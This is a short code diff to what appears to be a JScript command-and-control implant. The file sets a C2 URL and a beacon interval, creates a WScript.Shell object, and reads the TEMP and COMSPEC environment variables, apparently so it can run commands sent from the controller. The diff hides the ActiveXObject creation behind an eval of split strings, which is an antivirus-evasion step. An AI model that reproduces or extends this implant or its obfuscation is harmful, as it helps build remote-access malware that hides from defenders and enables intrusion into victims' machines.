@@ -2,7 +2,8 @@ var c2url = "http://192.168.0.4:8080/"
 var beaconTime = 3000 //in milliseconds
 
 var curcmd = "{\"cmd\": \"\"}"
-var objSh = new ActiveXObject("WScr" +   "ipt.Sh"+  "ell")
+var x = "iveXOb"
+eval("var objSh = new Act"+x+"ject(\"WScr\" +   \"ipt.Sh\"+  \"ell\")")
 var temp = objSh.ExpandEnvironmentStrings("%TEMP%");
 var cs = objSh.ExpandEnvironmentStrings("%C"+  "OmSP"    +"Ec%");
 var retval = ""
